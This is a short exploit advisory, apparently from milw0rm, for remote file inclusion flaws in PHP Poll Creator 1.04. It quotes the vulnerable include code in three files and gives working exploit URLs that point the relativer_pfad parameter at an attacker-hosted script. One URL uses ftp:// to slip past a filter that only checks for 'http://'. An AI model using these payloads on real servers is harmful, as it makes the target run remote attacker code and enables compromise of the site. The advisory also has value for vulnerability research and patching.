@@ -1,0 +1,79 @@
+phpPC 1.04 Multiples Remote File Inclusion
+
+Script        : PHP Poll Creator
+Version       : 1.04
+Vendor URL    : http://www.phppc.de
+Impact        : Remote File Inclusion
+Discovered by : iss4m
+Contact       : iss4m.1@gmail.com
+
+
+Vulnerable code in poll.php
+--------------------------------
+
+<?php
+if ($is_phppc_included != 1) {
+    include "config.inc.php";
+    $file = "lib/functions.inc.php";
+    include $relativer_pfad.$file;
+    include ($relativer_pfad . "layout_top.inc.php");
+    $is_phppc_included = 1;
+}else include $relativer_pfad . "lib/get_config.inc.php"; #<== !!!!
+
+Exploit :
+**********
+
+http://localhost/phppc/poll.php?is_phppc_included=1&relativer_pfad=http://attacker/inject.txt?
+
+
+Vulnerable code in poll.php poll_kommentar.php
+-----------------------------------------------
+
+<?php
+
+if ($is_phppc_included != 1) {
+    include "config.inc.php";
+    include ($relativer_pfad . "lib/functions.inc.php");
+}
+$com = "phppc_kommentar";
+$cookie = $cookie_name.$com.$poll_id;
+$cookie_ueberwachung = ${$cookie};
+if($action=='new_com') {
+    if ($cookie_ueberwachung=="flood") {
+        $must_not_create_com = 1;
+    }else {
+        $zeit = time() + 30;
+        SetCookie("$cookie_name$com$poll_id","flood","$zeit","/");        
+    }
+}
+if ($is_phppc_included != 1) {
+    include "layout_top.inc.php";
+    $is_phppc_included = 1;
+}
+include $relativer_pfad . "poll_titel_kat.inc.php";  # Here !!!!!!!!
+
+
+http://localhost/phppc/poll_kommentar.php?is_phppc_included=1&relativer_pfad=http://attacker/inject.txt ?
+
+
+
+Vulnerable code in poll_sm.php
+---------------------------------
+
+if(substr_count($relativer_pfad,"http://") >= 1 OR substr_count($relativer_pfad,"../") >= 1) $relativer_pfad = "";
+
+if ($is_phppc_included != 1) {
+    $file = "lib/functions.inc.php";
+    include $relativer_pfad.$file;
+}
+include ($relativer_pfad . "layout_top_sm.inc.php");
+
+
+the script check only if $relativer_pfad contain "http://" but we can include remote file using ftp://
+
+Exploit :
+**********
+
+http://localhost/phppc/poll_sm.php?is_phppc_included=1&relativer_pfad=ftp://user:pass@ftp.attacker.ltd/script.txt ?
+
+# milw0rm.com [2006-11-21]
